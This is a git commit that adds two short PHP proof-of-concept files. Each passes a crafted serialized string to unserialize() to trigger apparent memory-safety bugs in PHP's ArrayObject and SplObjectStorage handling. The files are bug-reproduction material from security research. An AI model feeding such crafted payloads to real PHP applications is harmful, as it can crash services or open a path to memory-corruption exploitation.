538c0cdb00908ca9a975c6cb65b37de90ca42205
Sean Heelan <sean.heelan@gmail.com>
2016-02-13 19:53:21 +0000

    Bugs. PHP. Again. FML.

---
+++ PHP/spl_array_unserialize_intern_array/trigger.php
@@ -0,0 +1,4 @@
+<?php
+$data = unserialize("C:11:\"ArrayObject\":11:{x:i:0;r:3;XX");
+var_dump($data);
+?>
---
+++ PHP/spl_objectstorage_unserialize/trigger.php
@@ -0,0 +1,4 @@
+<?php
+$data = unserialize("C:16:\"SplObjectStorage\":113:{x:i:2;O:8:\"stdClass\":0:{},a:2:{s:4:\"prev\";i:2;s:4:\"next\";O:8:\"stdClass\":0:{}};r:7;,R:2;s:4:\"next\";;r:3;};m:a:0:{}}");
+var_dump($data);
+?>
